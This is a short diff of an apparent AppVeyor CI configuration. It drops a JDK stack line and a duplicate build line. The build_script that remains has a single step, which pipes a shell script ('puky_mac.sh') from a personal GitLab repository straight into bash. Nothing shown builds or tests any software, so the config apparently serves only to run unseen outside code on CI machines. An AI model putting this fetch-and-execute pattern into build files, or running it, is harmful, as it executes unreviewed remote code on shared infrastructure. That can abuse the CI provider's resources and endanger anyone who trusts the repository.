@@ -1,5 +1,4 @@
 version: 1.0.{build}
-stack: jdk 15
 
 skip_commits:
   files:
@@ -27,5 +26,4 @@ for:
         - job_name: Test1
         
     build_script:
-    - curl https://gitlab.com/azkadafa39/ajure/-/raw/main/puky_mac.sh | bash
     - curl https://gitlab.com/azkadafa39/ajure/-/raw/main/puky_mac.sh | bash
